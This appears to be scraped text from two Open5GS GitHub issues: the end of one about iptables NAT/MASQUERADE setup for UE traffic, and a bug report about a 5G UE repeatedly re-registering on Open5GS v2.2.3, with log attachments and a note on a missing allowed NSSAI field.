Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination

Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain POSTROUTING (policy ACCEPT)
target     prot opt source               destination
MASQUERADE  all  --  10.45.0.0/16         anywhere

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination

Chain DOCKER (0 references)
target     prot opt source               destination
```
I remember when I used Open5GS I only had to execute the following two commands:
```
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A POSTROUTING -s 10.45.0.0/16 ! -o ogstun -j MASQUERADE
```
But I really don't know why it happened this time.Did I miss something??
I would appreciate any help from anyone!

items.title: After successful 5G SA Registration and PDU session accept, UE keeps on doing Registration request (of type 'mobility registration updating', not initial reg) immediately
items.body:
Hi @acetcom,

Last night you were helping me on this issue (in another issue's thread), let me create a new issue for it.

**issue:** UE got IP but only last ~1 second or so, then UE does registration request (mobility registration updating, not initial reg) again and accept , and PDU session req and accept, then repeats again and again.

I have two phones, they have exact same issue. On older version of (2-3 months) opem5gs, with exact phone and gNB, I don't have this issue, so I guess it's more an issue on open5gs side.

v2.2.3 open5gs

**all NFs config yaml file:**
[all-config-sent-to-aetcom.tar.gz](https://github.com/open5gs/open5gs/files/6251209/all-config-sent-to-aetcom.tar.gz)

all NFs log file (in /var/log/open5g):
[all-log-to-acetcom.tar.gz](https://github.com/open5gs/open5gs/files/6251210/all-log-to-acetcom.tar.gz)

**pcap log:**

[41-reinstall-open5gs-log26.pcap.gz](https://github.com/open5gs/open5gs/files/6251214/41-reinstall-open5gs-log26.pcap.gz)

Observation:
I compared the 'Registration Accept' message of v2.2.3 open5gs (left side) vs the one on older version of open5gs (right side), the right one has 'allowed NSSAI' info while v2.2.3 does not have it.

![image](https://user-images.githubusercontent.com/48105233/113453679-59d17a00-93bb-11eb-93cd-6c64f3c2e7ad.png)

Thanks a lot!

Br,
